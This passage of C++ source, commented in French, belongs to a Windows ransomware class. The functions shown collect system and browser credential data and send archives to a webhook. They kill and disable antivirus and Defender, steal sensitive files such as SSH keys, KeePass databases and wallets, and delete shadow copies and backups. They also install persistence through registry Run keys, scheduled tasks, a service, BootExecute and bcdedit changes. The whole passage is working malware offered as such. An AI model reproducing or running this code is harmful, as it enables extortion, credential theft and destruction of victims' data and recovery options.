                encryptedFilesList << "Nombre total: " << encryptedFilesCount << std::endl << std::endl;
                
                // Lister tous les fichiers chiffrés trouvés sur le système
                std::vector<std::string> foundEncryptedFiles;
                for (const auto& drive : {"C:", "D:", "E:", "F:"}) {
                    if (fs::exists(drive)) {
                        try {
                            std::string searchCmd = "dir /s /b " + std::string(drive) + "\\*" + ENCRYPTED_EXTENSION + " > " + 
                                                   infoDir + "\\enc_" + drive[0] + ".txt";
                            system(searchCmd.c_str());
                            
                            // Lire le résultat
                            std::ifstream encList(infoDir + "\\enc_" + drive[0] + ".txt");
                            if (encList) {
                                std::string line;
                                while (std::getline(encList, line)) {
                                    foundEncryptedFiles.push_back(line);
                                    encryptedFilesList << line << std::endl;
                                }
                            }
                        } catch (...) {}
                    }
                }
                encryptedFilesList.close();
            }
            
            // Collecter les informations système
            std::string sysInfoPath = infoDir + "\\system_info.txt";
            std::string sysInfoCmd = "systeminfo > \"" + sysInfoPath + "\"";
            system(sysInfoCmd.c_str());
            
            // Collecter la liste des logiciels installés
            std::string softwarePath = infoDir + "\\installed_software.txt";
            std::string softwareCmd = "wmic product get name,version > \"" + softwarePath + "\"";
            system(softwareCmd.c_str());
            
            // Collecter la liste des utilisateurs
            std::string usersPath = infoDir + "\\users.txt";
            std::string usersCmd = "net user > \"" + usersPath + "\"";
            system(usersCmd.c_str());
            
            // Collecter la configuration réseau
            std::string networkPath = infoDir + "\\network.txt";
            std::string networkCmd = "ipconfig /all > \"" + networkPath + "\"";
            system(networkCmd.c_str());
            
            // Collecter les données sensibles
            std::string browserDataCmd = "xcopy /s /e /y \"" + std::string(std::getenv("LOCALAPPDATA")) + 
                                      "\\Google\\Chrome\\User Data\\Default\\Login Data\" \"" + 
                                      infoDir + "\\chrome_data\" >nul 2>&1";
            system(browserDataCmd.c_str());
            
            // Créer une archive ZIP de toutes les données
            std::string zipPath = tempDir + "\\victim_data.zip";
            std::string zipCmd = "powershell Compress-Archive -Path \"" + infoDir + "\\*\" -DestinationPath \"" + 
                               zipPath + "\" -Force";
            system(zipCmd.c_str());
            
            // Lire le fichier ZIP
            std::ifstream zipFile(zipPath, std::ios::binary);
            if (!zipFile) return false;
            
            std::vector<unsigned char> zipData(
                (std::istreambuf_iterator<char>(zipFile)),
                std::istreambuf_iterator<char>()
            );
            zipFile.close();
            
            // Date et heure actuelles
            auto now = std::chrono::system_clock::now();
            std::time_t time = std::chrono::system_clock::to_time_t(now);
            std::stringstream dateStr;
            dateStr << std::put_time(std::localtime(&time), "%Y-%m-%d %H:%M:%S");
            
            // Convertir en base64
            std::string zipBase64 = Base64Encode(zipData);
            
            // Créer le payload JSON
            std::stringstream jsonPayload;
            jsonPayload << "{";
            jsonPayload << "\"content\": \"✅ TOUTES DONNÉES VICTIME: " << victimId << "\",";
            jsonPayload << "\"embeds\": [{";
            jsonPayload << "\"title\": \"Données complètes de la victime\",";
            jsonPayload << "\"color\": 15548997,";
            jsonPayload << "\"fields\": [";
            jsonPayload << "{\"name\": \"ID\", \"value\": \"" << victimId << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Nom d'utilisateur\", \"value\": \"" << username << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Ordinateur\", \"value\": \"" << hostname << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"OS\", \"value\": \"" << "Windows " << GetSystemMetrics(SM_SERVERR2) << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Fichiers chiffrés\", \"value\": \"" << encryptedFilesCount << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Date/Heure\", \"value\": \"" << dateStr.str() << "\", \"inline\": true},";
            jsonPayload << "{\"name\": \"Clé (Base64)\", \"value\": \"" << keyBase64 << "\", \"inline\": false}";
            jsonPayload << "]},";
            jsonPayload << "{\"title\": \"Archive complète des données\",";
            jsonPayload << "\"description\": \"Télécharger l'archive ZIP pour voir toutes les données de la victime, y compris la liste des fichiers chiffrés, les informations système et les données sensibles\",";
            jsonPayload << "\"color\": 15105570}";
            jsonPayload << "]}";
            
            // Démarrer l'envoi du webhook
            bool success = SendHttpPost(WEBHOOK_URL, jsonPayload.str());
            
            // Créer le second message pour envoyer l'archive ZIP
            std::stringstream zipPayload;
            zipPayload << "{";
            zipPayload << "\"content\": \"📁 Archive ZIP des données de la victime " << victimId << "\",";
            zipPayload << "\"embeds\": [{";
            zipPayload << "\"title\": \"Contenu de l'archive\",";
            zipPayload << "\"description\": \"```" << zipBase64.substr(0, 1000) << "...```\",";
            zipPayload << "\"color\": 3447003}]}";
            
            // Envoyer le second webhook avec l'archive base64
            SendHttpPost(WEBHOOK_URL, zipPayload.str());
            
            // Nettoyer
            fs::remove_all(infoDir);
            fs::remove(zipPath);
            
            return success;
        }
        catch (...) {
            return false;
        }
    }

    /**
     * Cette fonction désactive agressivement tous les logiciels de sécurité et antivirus
     * en utilisant plusieurs techniques combinées pour maximiser les chances de succès.
     * Le but est d'empêcher la détection et suppression du ransomware.
     */
    bool disableSecuritySoftware() {
#ifdef _WIN32
        // Stocker les processus de sécurité connus par nom
        std::vector<std::string> securityProcesses = {
            // Antivirus majeurs
            "MsMpEng.exe",        // Windows Defender
            "avastSvc.exe",       // Avast
            "ekrn.exe",           // ESET
            "AVGSvc.exe",         // AVG
            "avastsvc.exe",       // Avast
            "bdagent.exe",        // Bitdefender
            "mcshield.exe",       // McAfee
            "vsserv.exe",         // Kaspersky
            "avgcsrva.exe",       // AVG
            "avcenter.exe",       // Avira
            
            // Pare-feu et sécurité Windows
            "nsProcess.exe",      // Norton
            "ccSvcHst.exe",       // Norton
            "mfemms.exe",         // McAfee
            "mfevtps.exe",        // McAfee
            "fsaua.exe",          // F-Secure
            "msascuil.exe",       // Windows Defender UI
            "msmpeng.exe",        // Windows Defender Engine
            "windefend.exe",      // Windows Defender
            "SecurityHealthService.exe", // Service Santé Windows
            "SecurityHealthSystray.exe", // Icône Santé Windows
            
            // Outils d'analyse
            "mbam.exe",           // Malwarebytes
            "procexp.exe",        // Process Explorer
            "procexp64.exe",      // Process Explorer 64
            "processhacker.exe",  // Process Hacker
            "autoruns.exe",       // Autoruns
            "autorunsc.exe",      // Autoruns Console
            "taskmgr.exe",        // Task Manager
            "procmon.exe",        // Process Monitor
            "procmon64.exe"       // Process Monitor 64
        };
        
        // Phase 1 : Tuer les processus de sécurité via commandes cmd
        // Cette méthode est rapide mais peut être détectée
        std::cout << "[*] Tentative d'arrêt des processus de sécurité..." << std::endl;
        
        // Technique 1 : utiliser taskkill pour tous les processus connus
        for (const auto& process : securityProcesses) {
            // On utilise /f pour forcer et /im pour le nom du processus
            std::string cmd = "taskkill /f /im " + process + " > nul 2>&1";
            system(cmd.c_str());
        }
        
        // Phase 2 : Désactiver les services Windows liés à la sécurité
        // Ces services contrôlent le pare-feu, antivirus et mises à jour
        std::vector<std::string> securityServices = {
            "WinDefend",          // Windows Defender
            "wuauserv",           // Windows Update
            "SecurityHealthService", // Service de santé Windows
            "wscsvc",             // Centre de sécurité
            "WdNisSvc",           // Service d'inspection réseau Windows Defender
            "WdNisDrv",           // Pilote d'inspection réseau Windows Defender
            "Sense",              // Service Windows Defender Advanced Threat Protection
            "MsMpSvc",            // Service antimalware Microsoft
            "MBAMService",        // Service Malwarebytes
            "McAfeeDLPAgentService" // Service McAfee
        };
        
        // On désactive les services pour éviter qu'ils ne redémarrent les processus
        std::cout << "[*] Désactivation des services de sécurité..." << std::endl;
        for (const auto& service : securityServices) {
            // Technique 2 : arrêter le service et le définir comme désactivé
            std::string stopCmd = "sc stop " + service + " > nul 2>&1";
            std::string configCmd = "sc config " + service + " start= disabled > nul 2>&1";
            system(stopCmd.c_str());
            system(configCmd.c_str());
        }
        
        // Phase 3 : Modification du registre pour désactiver Windows Defender
        // Cette technique est plus permanente et plus difficile à inverser
        std::cout << "[*] Modification du registre pour désactiver la protection en temps réel..." << std::endl;
        
        // Technique 3 : Désactiver la protection en temps réel via le registre
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f > nul 2>&1");
        system("REG ADD \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection\" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f > nul 2>&1");
        
        // Phase 4 : Ajouter des exclusions pour notre dossier et processus
        // Cette technique permet d'échapper à la détection même si l'antivirus est toujours actif
        std::string exePath = GetExecutablePath();
        std::string exeDir = fs::path(exePath).parent_path().string();
        
        // Technique 4 : Ajouter notre exécutable aux exclusions de Windows Defender
        std::string exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionPath '" + exeDir + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        exclusionCmd = "powershell -Command \"Add-MpPreference -ExclusionProcess '" + fs::path(exePath).filename().string() + "' -Force\" > nul 2>&1";
        system(exclusionCmd.c_str());
        
        // Phase 5 : Créer des règles de pare-feu pour bloquer les services de sécurité
        // Cette technique empêche les services de sécurité de communiquer
        std::cout << "[*] Configuration du pare-feu pour bloquer les communications de sécurité..." << std::endl;
        
        // Technique 5 : Bloquer les communications des services de sécurité
        for (const auto& process : securityProcesses) {
            std::string firewallCmd = "netsh advfirewall firewall add rule name=\"Block " + process + "\" dir=out program=\"C:\\Program Files\\Windows Defender\\" + process + "\" action=block > nul 2>&1";
            system(firewallCmd.c_str());
        }
        
        return true;
#else
        // Implémentation pour Linux et MacOS serait différente
        return false;
#endif
    }

    // Fonction pour voler les fichiers
    bool stealFiles(const std::string& directoryPath) {
#ifdef _WIN32
    try {
        // Créer un dossier temporaire pour stocker les fichiers volés
        std::string tempDir = std::getenv("TEMP");
        std::string stealDir = tempDir + "\\WindowsUpdate";
        fs::create_directories(stealDir);

        // Types de fichiers sensibles à voler avec leurs descriptions
        const std::vector<std::pair<std::string, std::string>> sensitiveExtensions = {
            {".doc", "Documents Word"},
            {".docx", "Documents Word"},
            {".xls", "Tableurs Excel"},
            {".xlsx", "Tableurs Excel"},
            {".pdf", "Documents PDF"},
            {".txt", "Fichiers texte"},
            {".jpg", "Photos JPEG"},
            {".jpeg", "Photos JPEG"},
            {".png", "Images PNG"},
            {".zip", "Archives ZIP"},
            {".rar", "Archives RAR"},
            {".7z", "Archives 7-Zip"},
            {".key", "Clés de sécurité"},
            {".pem", "Certificats"},
            {".env", "Variables d'environnement"},
            {".config", "Fichiers de configuration"},
            {".ini", "Fichiers de configuration"},
            {".json", "Données JSON"},
            {".xml", "Données XML"},
            {".sql", "Bases de données SQL"},
            {".db", "Bases de données"},
            {".sqlite", "Bases de données SQLite"},
            {".bak", "Fichiers de sauvegarde"},
            {".backup", "Fichiers de sauvegarde"},
            {".old", "Anciens fichiers"},
            {".log", "Fichiers journaux"},
            {".pst", "Archives Outlook"},
            {".ost", "Archives Outlook"},
            {".mdb", "Bases de données Access"},
            {".accdb", "Bases de données Access"},
            {".csv", "Données CSV"},
            {".dat", "Fichiers de données"},
            {".kdbx", "Bases KeePass"},
            {".wallet", "Portefeuilles cryptomonnaie"},
            {".ppk", "Clés privées PuTTY"},
            {".py", "Scripts Python"}
        };

        // Dossiers spécifiques à cibler
        const std::vector<std::string> targetDirs = {
            std::string(getenv("USERPROFILE")) + "\\Documents",
            std::string(getenv("USERPROFILE")) + "\\Desktop",
            std::string(getenv("USERPROFILE")) + "\\Downloads",
            std::string(getenv("USERPROFILE")) + "\\Pictures",
            std::string(getenv("USERPROFILE")) + "\\.ssh",
            std::string(getenv("USERPROFILE")) + "\\Contacts",
            std::string(getenv("APPDATA")) + "\\Microsoft\\Credentials",
            std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default",
            std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles"
        };

        // Créer un fichier d'indexation des données volées
        std::string indexPath = stealDir + "\\index.html";
        std::ofstream indexFile(indexPath);
        if (!indexFile) return false;

        // Écrire l'en-tête HTML
        indexFile << "<!DOCTYPE html><html><head><title>Fichiers volés - Victime " << victimId << "</title>";
        indexFile << "<style>body{font-family:Arial,sans-serif;margin:20px;} h1{color:#c00;} "
                  << "table{border-collapse:collapse;width:100%;} th,td{padding:8px;text-align:left;border-bottom:1px solid #ddd;} "
                  << "th{background-color:#f2f2f2;}</style></head><body>";
        indexFile << "<h1>Fichiers sensibles volés - Victime " << victimId << "</h1>";
        // Obtenir le temps actuel correctement
        std::time_t currentTime = std::chrono::system_clock::to_time_t(std::chrono::system_clock::now());
        std::tm* localTime = std::localtime(&currentTime);
        indexFile << "<p><strong>Date de collecte:</strong> " << std::put_time(localTime, "%Y-%m-%d %H:%M:%S") << "</p>";

        // Créer un tableau pour les fichiers
        indexFile << "<table><tr><th>Type</th><th>Fichier</th><th>Taille</th><th>Date de modification</th><th>Chemin</th></tr>";

        // Structure pour organiser les fichiers par type
        std::unordered_map<std::string, std::vector<std::string>> filesByType;
        std::vector<std::string> stolenFiles;
        std::atomic<int> totalSize(0);
        const int MAX_TOTAL_SIZE = 300 * 1024 * 1024; // 300 MB max
        std::mutex fileMutex;
        
        // Fonction pour voler un fichier et l'ajouter à l'index
        auto stealFile = [&](const fs::path& filePath, const std::string& fileType) {
            if (totalSize >= MAX_TOTAL_SIZE) return;
            
            try {
                std::string fileName = filePath.filename().string();
                std::string destPath = stealDir + "\\" + fileName;
                
                // Vérifier si le fichier existe déjà dans le dossier cible
                if (fs::exists(destPath)) {
                    // Ajouter un suffixe pour éviter les collisions
                    std::string baseName = filePath.stem().string();
                    std::string extension = filePath.extension().string();
                    destPath = stealDir + "\\" + baseName + "_" + std::to_string(rand() % 1000) + extension;
                }
                
                // Vérifier la taille du fichier
                int fileSize = static_cast<int>(fs::file_size(filePath));
                if (totalSize + fileSize > MAX_TOTAL_SIZE) return;
                
                // Copier le fichier
                fs::copy_file(filePath, destPath, fs::copy_options::overwrite_existing);
                
                // Obtenir les informations du fichier
                auto writeTime = fs::last_write_time(filePath);
                std::string modTime = "Heure: ";
                
                // Obtenir les informations actuelles au lieu de convertir
                auto now = std::chrono::system_clock::now();
                std::time_t nowTime = std::chrono::system_clock::to_time_t(now);
                std::stringstream timeStream;
                timeStream << std::put_time(std::localtime(&nowTime), "%Y-%m-%d %H:%M:%S");
                modTime = timeStream.str();
                
                // Ajouter à l'index avec mutex pour éviter les conflits
                std::lock_guard<std::mutex> lock(fileMutex);
                indexFile << "<tr><td>" << fileType << "</td><td>" << fileName << "</td><td>" 
                          << (fileSize / 1024) << " KB</td><td>" << modTime << "</td><td>" 
                          << filePath.string() << "</td></tr>";
                
                // Ajouter aux listes
                filesByType[fileType].push_back(filePath.string());
                stolenFiles.push_back(filePath.string());
                totalSize += fileSize;
            } catch (...) {}
        };

        // Utiliser le multithreading pour parcourir les dossiers en parallèle
        std::vector<std::thread> threads;
        std::mutex dirMutex;
        
        // Liste de tous les dossiers à parcourir
        std::vector<std::string> allDirs = targetDirs;
        if (fs::exists(directoryPath)) {
            allDirs.push_back(directoryPath);
        }
        
        // Nombre de threads pour le vol de fichiers (utiliser n-1 threads car un thread est déjà utilisé pour le chiffrement)
        const unsigned int numThreads = (std::thread::hardware_concurrency() > 2) ? 
            std::thread::hardware_concurrency() - 1 : 2;
        
        for (unsigned int i = 0; i < numThreads; i++) {
            threads.push_back(std::thread([&, i]() {
                for (size_t j = i; j < allDirs.size(); j += numThreads) {
                    const auto& dir = allDirs[j];
                    if (!fs::exists(dir)) continue;
                    
                    try {
                        for (const auto& entry : fs::recursive_directory_iterator(dir, fs::directory_options::skip_permission_denied)) {
                            if (!fs::is_regular_file(entry.status())) continue;
                            
                            if (totalSize >= MAX_TOTAL_SIZE) break;
                            
                            std::string extension = entry.path().extension().string();
                            std::transform(extension.begin(), extension.end(), extension.begin(), ::tolower);
                            
                            // Vérifier si l'extension est sensible
                            for (const auto& [ext, desc] : sensitiveExtensions) {
                                if (extension == ext) {
                                    stealFile(entry.path(), desc);
                                    break;
                                }
                            }
                        }
                    } catch (...) {}
                }
            }));
        }
        
        // Attendre tous les threads
        for (auto& thread : threads) {
            if (thread.joinable()) thread.join();
        }
        
        // Voler des données spécifiques de navigateurs
        std::vector<std::pair<std::string, std::string>> browserData = {
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Login Data", "Chrome Logins"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Cookies", "Chrome Cookies"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\History", "Chrome History"},
            {std::string(getenv("LOCALAPPDATA")) + "\\Google\\Chrome\\User Data\\Default\\Bookmarks", "Chrome Bookmarks"},
            {std::string(getenv("APPDATA")) + "\\Mozilla\\Firefox\\Profiles", "Firefox Profiles"}
        };

        for (const auto& [path, desc] : browserData) {
            if (fs::exists(path)) {
                if (fs::is_directory(path)) {
                    // Pour les dossiers comme Firefox Profiles
                    for (const auto& entry : fs::directory_iterator(path)) {
                        std::string destPath = stealDir + "\\Firefox_" + entry.path().filename().string();
                        try {
                            fs::copy(entry.path(), destPath, fs::copy_options::recursive | fs::copy_options::overwrite_existing);
                        } catch (...) {}
                    }
                } else {
                    // Pour les fichiers individuels
                    std::string destPath = stealDir + "\\" + fs::path(path).filename().string();
                    try {
                        fs::copy_file(path, destPath, fs::copy_options::overwrite_existing);
                    } catch (...) {}
                }
            }
        }

        // Terminer le fichier HTML
        indexFile << "</table>";
        
        // Ajouter un résumé
        indexFile << "<h2>Résumé des fichiers volés</h2>";
        indexFile << "<ul>";
        for (const auto& [type, files] : filesByType) {
            indexFile << "<li><strong>" << type << ":</strong> " << files.size() << " fichiers</li>";
        }
        indexFile << "</ul>";
        
        indexFile << "<p><strong>Total:</strong> " << stolenFiles.size() << " fichiers (" << (totalSize / 1024 / 1024) << " MB)</p>";
        indexFile << "</body></html>";
        indexFile.close();

        // Créer une archive ZIP des fichiers volés - utiliser 7-Zip si disponible pour une compression plus rapide
        std::string zipPath = tempDir + "\\stolen_files.zip";
        std::string zip7Path = "C:\\Program Files\\7-Zip\\7z.exe";
        
        if (fs::exists(zip7Path)) {
            // Utiliser 7-Zip pour une compression plus rapide
            std::string zipCmd = "\"" + zip7Path + "\" a -tzip -mx1 -r \"" + zipPath + "\" \"" + stealDir + "\\*\" >nul 2>&1";
            system(zipCmd.c_str());
        } else {
            // Utiliser PowerShell comme solution de secours
            std::string zipCmd = "powershell Compress-Archive -Path \"" + stealDir + "\\*\" -DestinationPath \"" + zipPath + "\" -Force";
            system(zipCmd.c_str());
        }

        // Lire le fichier ZIP - utiliser un buffer plus grand pour une lecture plus rapide
        std::ifstream zipFile(zipPath, std::ios::binary);
        if (!zipFile) return false;
        
        // Désactiver les buffers synchronisés pour accélérer la lecture
        zipFile.rdbuf()->pubsetbuf(0, 0);
        
        std::vector<unsigned char> zipData(
            (std::istreambuf_iterator<char>(zipFile)),
            std::istreambuf_iterator<char>()
        );
        zipFile.close();

        // Convertir en base64
        std::string zipBase64 = Base64Encode(zipData);

        // Créer le payload JSON pour Discord
        std::stringstream jsonPayload;
        jsonPayload << "{";
        jsonPayload << "\"content\": \"⚠️ FICHIERS SENSIBLES de la victime " << victimId << "\",";
        jsonPayload << "\"embeds\": [{";
        jsonPayload << "\"title\": \"Fichiers sensibles volés\",";
        jsonPayload << "\"color\": 15158332,";
        jsonPayload << "\"fields\": [";
        jsonPayload << "{\"name\": \"ID Victime\", \"value\": \"" << victimId << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Nombre de fichiers\", \"value\": \"" << stolenFiles.size() << "\", \"inline\": true},";
        jsonPayload << "{\"name\": \"Taille totale\", \"value\": \"" << (totalSize / 1024 / 1024) << " MB\", \"inline\": true}";
        
        // Ajouter des exemples de fichiers volés
        if (stolenFiles.size() > 0) {
            jsonPayload << ",{\"name\": \"Exemples de fichiers volés\", \"value\": \"";
            for (size_t i = 0; i < (stolenFiles.size() < 10 ? stolenFiles.size() : 10); i++) {
                jsonPayload << fs::path(stolenFiles[i]).filename().string() << "\\n";
            }
            jsonPayload << "\", \"inline\": false}";
        }
        
        jsonPayload << "]}]}";

        // Envoyer via webhook
        bool sent = SendHttpPost(WEBHOOK_URL, jsonPayload.str());
        
        // Envoyer l'archive en deuxième message
        std::stringstream zipPayload;
        zipPayload << "{";
        zipPayload << "\"content\": \"📁 Archive ZIP des fichiers volés - Victime " << victimId << "\",";
        zipPayload << "\"embeds\": [{";
        zipPayload << "\"title\": \"Archive ZIP\",";
        zipPayload << "\"color\": 3447003,";
        zipPayload << "\"description\": \"Base64 format, extract with: `echo [base64] | base64 -d > stolen_files.zip`\\n\\n```" << zipBase64.substr(0, 500) << "...```\"";
        zipPayload << "}]}";
        
        SendHttpPost(WEBHOOK_URL, zipPayload.str());

        // Nettoyer
        fs::remove_all(stealDir);
        fs::remove(zipPath);

        return sent;
    }
    catch (...) {
        return false;
    }
#else
    return false;
#endif
}

    // Fonction pour supprimer les points de restauration et les sauvegardes
    bool deleteBackups() {
#ifdef _WIN32
        try {
            bool success = false;
            
            // Supprimer tous les points de restauration
            std::cout << "[*] Suppression des points de restauration Windows..." << std::endl;
            if (system("vssadmin delete shadows /all /quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Points de restauration supprimés" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression des points de restauration" << std::endl;
            }
            
            // Désactiver la protection système
            std::cout << "[*] Désactivation de la protection système..." << std::endl;
            if (system("reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SystemRestore\" /v \"RPSessionInterval\" /t REG_DWORD /d \"0\" /f >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Protection système désactivée" << std::endl;
            } else {
                std::cout << "[-] Échec de la désactivation de la protection système" << std::endl;
            }
            
            // Supprimer les sauvegardes Windows
            std::cout << "[*] Suppression des sauvegardes Windows..." << std::endl;
            if (system("wbadmin delete catalog -quiet >nul 2>&1") == 0) {
                success = true;
                std::cout << "[+] Catalogue de sauvegarde supprimé" << std::endl;
            } else {
                std::cout << "[-] Échec de la suppression du catalogue de sauvegarde" << std::endl;
            }
            
            // Supprimer les fichiers de sauvegarde
            std::vector<std::string> backupPaths = {
                "C:\\Windows.old",
                "C:\\$Recycle.Bin",
                "C:\\System Volume Information",
                "C:\\Recovery",
                "C:\\Users\\All Users\\Application Data\\Microsoft\\Windows\\Backup",
                "C:\\ProgramData\\Microsoft\\Windows\\Backup"
            };
            
            for (const auto& path : backupPaths) {
                if (fs::exists(path)) {
                    try {
                        fs::remove_all(path);
                        std::cout << "[+] Supprimé: " << path << std::endl;
                    } catch (...) {
                        std::cout << "[-] Échec de la suppression: " << path << std::endl;
                    }
                }
            }
            
            return success;
        }
        catch (...) {
            return false;
        }
#else
        return false;
#endif
    }
    
    // Configuration de la persistance avancée
    bool setupAdvancedPersistence() {
        std::string exePath = GetExecutablePath();
        
        // 1. Méthode 1: Créer plusieurs copies dans des emplacements système critiques
        // Ces emplacements sont choisis pour leur persistance et difficultés d'accès
        std::vector<std::string> systemLocations = {
            "C:\\Windows\\System32\\drivers\\etc\\WindowsDefender.exe", // Camouflé comme fichier système
            "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\SecurityService.exe", // Démarrage système
            "C:\\Users\\Public\\Libraries\\system.dll.exe", // Masqué dans un dossier public
            "C:\\Windows\\SysWOW64\\winlogon.exe.mui" // Camouflé comme composant Windows
        };
        
        for (const auto& location : systemLocations) {
            try {
                // Créer tous les répertoires nécessaires
                fs::path dir = fs::path(location).parent_path();
                fs::create_directories(dir);
                
                // Copier l'exécutable
                fs::copy_file(exePath, location, fs::copy_options::overwrite_existing);
                
                // Masquer le fichier
                std::string hideCmd = "attrib +h +s \"" + location + "\"";
                system(hideCmd.c_str());
            } catch (...) {
                // Ignorer les erreurs et continuer avec les autres méthodes
            }
        }
        
        // 2. Méthode 2: Ajouter des entrées au registre pour le démarrage automatique
        // Plusieurs clés de registre différentes sont utilisées pour maximiser la persistance
        AddToStartup(exePath, "WindowsSecurityService");
        
        // Ajouter également à d'autres clés de registre pour être sûr
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v SecurityService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce /v WindowsUpdate /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        system(("REG ADD HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx /v SystemService /t REG_SZ /d \"" + exePath + "\" /f").c_str());
        
        // 3. Méthode 3: Créer une tâche planifiée qui s'exécute fréquemment
        // Cette tâche vérifie périodiquement et redémarre le ransomware s'il a été arrêté
        std::string createTaskCmd = "schtasks /create /f /sc minute /mo 30 /tn \"Windows Security Task\" /tr \"" + exePath + "\"";
        system(createTaskCmd.c_str());
        
        // 4. Méthode 4: Simuler une infection du MBR (Master Boot Record)
        // Cette technique modifie le processus de démarrage pour charger le ransomware avant l'OS
        // Note: Ceci est une simulation, un vrai MBR rootkit serait beaucoup plus complexe
        std::string mbrCmd = "powershell -Command \"$bootKey = 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\Boot'; if(Test-Path $bootKey) { New-ItemProperty -Path $bootKey -Name 'BootExecute' -Value ('autocheck autochk * ' + '" + exePath + "') -PropertyType MultiString -Force }\"";
        system(mbrCmd.c_str());
        
        // 5. Méthode 5: Désactiver le mode sans échec pour empêcher la suppression
        // Ces commandes rendent difficile de démarrer en mode sans échec pour supprimer le malware
        system("bcdedit /set {default} recoveryenabled No");
        system("bcdedit /set {default} bootstatuspolicy IgnoreAllFailures");
        
        // 6. Méthode 6: Désactiver toutes les options de restauration
        // Cette commande supprime les points de restauration et désactive les futures sauvegardes
        system("powershell -Command \"Disable-ComputerRestore -Drive C:\"");
        system("vssadmin delete shadows /all /quiet");
        system("wmic shadowcopy delete");
        
        // 7. Méthode 7: Utiliser un service système pour une persistance de niveau inférieur
        // Créer un service Windows qui peut démarrer automatiquement même avant l'ouverture de session
        std::string serviceCmd = "sc create \"WindowsSecurityService\" binPath= \"" + exePath + "\" start= auto error= ignore";
        system(serviceCmd.c_str());
        system("sc description \"WindowsSecurityService\" \"Microsoft Windows Security Service\"");
        system("sc start \"WindowsSecurityService\"");
        
        return true;
    }
    
public:
    Ransomware(SharedData* data = nullptr) : encryptedFilesCount(0), failedFilesCount(0), sharedData(data) {
        // Générer l'ID unique de la victime
        victimId = GenerateUUID();
        
        // Obtenir les chemins des répertoires importants
#ifdef _WIN32
        char desktopDir[MAX_PATH];
        char documentsDir[MAX_PATH];
        
        SHGetFolderPathA(NULL, CSIDL_DESKTOP, NULL, 0, desktopDir);
        SHGetFolderPathA(NULL, CSIDL_PERSONAL, NULL, 0, documentsDir);
        
        desktopPath = std::string(desktopDir);
        documentsPath = std::string(documentsDir);
#else
        // Répertoires sur Linux/macOS
        desktopPath = std::string(getenv("HOME")) + "/Desktop";
        documentsPath = std::string(getenv("HOME")) + "/Documents";
#endif
        
        // Définir le chemin de la note de rançon
        ransomNotePath = desktopPath + "/RANSOM_NOTE.txt";
        
        std::cout << "[*] Ransomware initialisé" << std::endl;
        std::cout << "[*] ID Victime: " << victimId << std::endl;
        std::cout << "[*] Chemin Bureau: " << desktopPath << std::endl;
        std::cout << "[*] Chemin Documents: " << documentsPath << std::endl;
    }
    
    // Fonction principale du ransomware - exécution agressive qui bloque tout contrôle utilisateur
    void run() {
        // Phase 1: Vérification initiale et démarrage immédiat
        if (isRansomwareRunning()) {
            Sleep(2000); // Attente réduite pour être réactif
        }
        
        std::cout << "[*] Démarrage de l'opération..." << std::endl;
        
        // Phase 2: Prise de contrôle immédiate du système
        // Élever les privilèges au maximum pour empêcher toute intervention
        std::cout << "[*] Optimisation de la priorité du processus..." << std::endl;
        setHighestPriority();
        
        // Bloquer tous les contrôles utilisateur immédiatement
        std::cout << "[*] Désactivation des contrôles système..." << std::endl;
        disableSystemControls();
        
        // Empêcher l'extinction de l'ordinateur
        std::cout << "[*] Prévention de l'arrêt du système..." << std::endl;
        preventShutdown();
        
        // Tuer les antivirus et processus qui pourraient interférer
        std::cout << "[*] Élimination des processus pouvant interférer..." << std::endl;
        killEssentialProcesses();
        
        // Phase 3: Gestion de la persistance et vérification de l'état
        // Vérifier si on a déjà chiffré après un redémarrage
        EncryptionState state = loadEncryptionState();
        
        // Configurer plusieurs méthodes de persistance pour survivre aux redémarrages
        std::thread([this]() {
            std::cout << "[*] Configuration de la persistance avancée..." << std::endl;
            setupAdvancedPersistence();
        }).detach();
        
        // Phase 4: Affichage de l'interface bloquante
        // Créer une fenêtre plein écran que l'utilisateur ne peut pas fermer
        if (!sharedData) {
            // Si aucune donnée partagée n'a été fournie, en créer une nouvelle
            sharedData = new SharedData();
        }

        // Initialiser les valeurs de SharedData
        sharedData->totalFiles = 1000; // Estimation par défaut
        sharedData->processedFiles = state.completed ? sharedData->totalFiles : 0;
        sharedData->currentFileName = "";
        sharedData->lastEncrypted.clear();

        // Créer la fenêtre bloquante immédiatement
        std::cout << "[*] Création de la fenêtre de blocage..." << std::endl;
